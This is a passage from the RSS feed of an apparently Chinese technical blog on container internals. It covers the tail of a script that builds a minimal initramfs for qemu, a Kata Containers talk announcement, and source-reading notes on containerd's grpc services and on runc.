+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;43&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;44&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;45&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;Welcome to mini_linux
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;46&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;47&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;48&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;!
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;49&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;exec /bin/sh
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;50&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;51&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;52&lt;/span&gt;&lt;span class="cl"&gt;chmod +x init
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;53&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;54&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# package into a initramfs&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;55&lt;/span&gt;&lt;span class="cl"&gt;rm -fv /tmp/initramfs.cpio.gz &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;56&lt;/span&gt;&lt;span class="cl"&gt;find . -print0 &lt;span class="p"&gt;|&lt;/span&gt; cpio --null -ov --format&lt;span class="o"&gt;=&lt;/span&gt;newc &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;57&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; gzip -9 &amp;gt; /tmp/initramfs.cpio.gz
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;58&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;59&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;===========&amp;gt; initramfs is saved as /tmp/initramfs.cpio.gz&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;60&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;61&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CWD&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;62&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# boot with qemu&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;63&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# sudo qemu-system-x86_64 -enable-kvm -kernel build/kernel -initrd initramfs.cpio.gz -nographic -append &amp;#34;console=ttyS0&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>Kata Containers介绍，附上演讲ppt</title><link>https://weizhang555.github.io/original/kata-containers-introduction/</link><pubDate>Sun, 08 Apr 2018 22:00:00 +0800</pubDate><guid>https://weizhang555.github.io/original/kata-containers-introduction/</guid><description>
+&lt;p&gt;最近在51cto举办的meetup上做了关于Kata Containers的演讲，
+KataContainers是github上的新项目，前身是Intel的clear container和Hyper的runv，
+融合了普通容器的轻快和虚拟机的高隔离高安全性的优点。&lt;/p&gt;
+&lt;p&gt;详细可以直接参观Kata Containers的github主页：
+&lt;a href="https://github.com/kata-containers/runtime"&gt;https://github.com/kata-containers/runtime&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;演讲的链接传送门：http://developer.huawei.com/ict/forum/thread-48823.html&lt;/p&gt;
+&lt;p&gt;完整的演讲ppt可以在此处下载：
+&lt;a href="https://weizhang555.github.io/post/files/Kata%E4%BB%8B%E7%BB%8D%E4%B8%8EHuawei_iSula%E5%AE%89%E5%85%A8%E5%AE%B9%E5%99%A8-%E5%BC%A0%E4%BC%9F.ppt"&gt;Kata介绍与Huawei_iSula安全容器-张伟.ppt&lt;/a&gt;&lt;/p&gt;</description></item><item><title>containerd源码阅读(1)--框架篇</title><link>https://weizhang555.github.io/original/containerd-code-analysis/</link><pubDate>Tue, 12 Sep 2017 22:40:46 +0800</pubDate><guid>https://weizhang555.github.io/original/containerd-code-analysis/</guid><description>
+&lt;h2 id="1-简介"&gt;1. 简介&lt;/h2&gt;
+&lt;p&gt;containerd是与docker直接沟通的下属组件，详细是什么不说了。
+每个docker daemon启动的时候都会启动一个containerd daemon，启动容器的时候，
+每个容器的init进程／exec进程都会对应一个containerd-shim进程，
+containerd-shim同样是containerd库里面单独的一个二进制程序，
+containerd-shim会调用runc最终启动容器。
+这些基本的知识一笔带过不详细展开。&lt;/p&gt;
+&lt;p&gt;随着docker改名为moby，docker的大部分功能，比如image管理，容器运行都会下沉到containerd，
+docker会越来越侧重于编排调度部分--swarm。&lt;/p&gt;
+&lt;p&gt;简单分析下containerd的代码架构，作为官方containerd文档的一个补充。
+本篇以git commit &lt;code&gt;d700a9c35b09239c8c056cd5df73bc19a79db9a9&lt;/code&gt; 为标准讲解。&lt;/p&gt;
+&lt;h2 id="2-grpc"&gt;2. grpc&lt;/h2&gt;
+&lt;p&gt;containerd的架构极其依赖grpc协议。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# ls api/services/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;2&lt;/span&gt;&lt;span class="cl"&gt;containers content diff events images namespaces snapshot tasks version
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;api/services&lt;/code&gt;目录下存放着containerd提供的不同服务对应的grpc接口。
+以比较基础的content服务为例，&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# ls api/services/content/v1/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;2&lt;/span&gt;&lt;span class="cl"&gt;content.pb.go content.proto
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下面一共有两个文件，一个content.proto一个是.pb.go, 其中用户只需要定义content.proto文件，
+而程序最终使用的content.pb.go则可以由grpc命令自动生成。
+containerd在Makefile中提供了生成&lt;code&gt;.pb.go&lt;/code&gt;的指令&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;// 安装依赖的库
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;2&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# cd containerd &amp;amp;&amp;amp; make setup &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;3&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# make protos&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;打开content.proto 来看，里面主要定义了一个service：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 1&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;13&lt;/span&gt; service Content &lt;span class="o"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 2&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;14&lt;/span&gt; // Info returns information about a committed object.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 3&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;15&lt;/span&gt; //
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 4&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;16&lt;/span&gt; // This call can be used &lt;span class="k"&gt;for&lt;/span&gt; getting the size of content and checking &lt;span class="k"&gt;for&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 5&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;17&lt;/span&gt; // existence.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 6&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;18&lt;/span&gt; rpc Info&lt;span class="o"&gt;(&lt;/span&gt;InfoRequest&lt;span class="o"&gt;)&lt;/span&gt; returns &lt;span class="o"&gt;(&lt;/span&gt;InfoResponse&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 7&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;19&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 8&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;20&lt;/span&gt; // Update updates content metadata.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 9&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;21&lt;/span&gt; //
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;10&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;22&lt;/span&gt; // This call can be used to manage the mutable content labels. The
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;11&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;23&lt;/span&gt; // immutable metadata such as digest, size, and committed at cannot
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;12&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;24&lt;/span&gt; // be updated.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;13&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;25&lt;/span&gt; rpc Update&lt;span class="o"&gt;(&lt;/span&gt;UpdateRequest&lt;span class="o"&gt;)&lt;/span&gt; returns &lt;span class="o"&gt;(&lt;/span&gt;UpdateResponse&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;14&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;26&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;15&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;27&lt;/span&gt; // List streams the entire &lt;span class="nb"&gt;set&lt;/span&gt; of content as Info objects and closes the
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;16&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;28&lt;/span&gt; // stream.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;17&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;29&lt;/span&gt; //
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;18&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;30&lt;/span&gt; // Typically, this will yield a large response, chunked into messages.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;19&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;31&lt;/span&gt; // Clients should make provisions to ensure they can handle the entire data
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;20&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;32&lt;/span&gt; // set.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;21&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;33&lt;/span&gt; rpc List&lt;span class="o"&gt;(&lt;/span&gt;ListContentRequest&lt;span class="o"&gt;)&lt;/span&gt; returns &lt;span class="o"&gt;(&lt;/span&gt;stream ListContentResponse&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;22&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;34&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;23&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;35&lt;/span&gt; // Delete will delete the referenced object.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;24&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;36&lt;/span&gt; rpc Delete&lt;span class="o"&gt;(&lt;/span&gt;DeleteContentRequest&lt;span class="o"&gt;)&lt;/span&gt; returns &lt;span class="o"&gt;(&lt;/span&gt;google.protobuf.Empty&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;25&lt;/span&gt;&lt;span class="cl"&gt;...省略...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;以及很多message结构体，message可以理解成是service定义的接口使用到的结构体，是通信的结构化的数据流。&lt;/p&gt;</description></item><item><title>runc源码阅读</title><link>https://weizhang555.github.io/original/runc-code-analysis/</link><pubDate>Tue, 12 Sep 2017 22:40:46 +0800</pubDate><guid>https://weizhang555.github.io/original/runc-code-analysis/</guid><description>
+&lt;p&gt;runc是docker的核心底层依赖，是容器运行的runtime，目前所属的仓库是opencontainers/runc,
+是docker将原先的libcontainer模块独立出来，并贡献给oci社区的产物。&lt;/p&gt;
+&lt;p&gt;一直想写一下runc的源码分析，但是一直没有时间。暂时先把自己阅读runc过程中画得xmind思维脑图放出来吧，
+里面的内容是runc的代码流程分析。有时间再回来补齐源码分析。&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://weizhang555.github.io/post/files/runc%E9%98%85%E8%AF%BB.xmind"&gt;runc源码分析xmind文件&lt;/a&gt;&lt;/p&gt;</description></item></channel></rss>
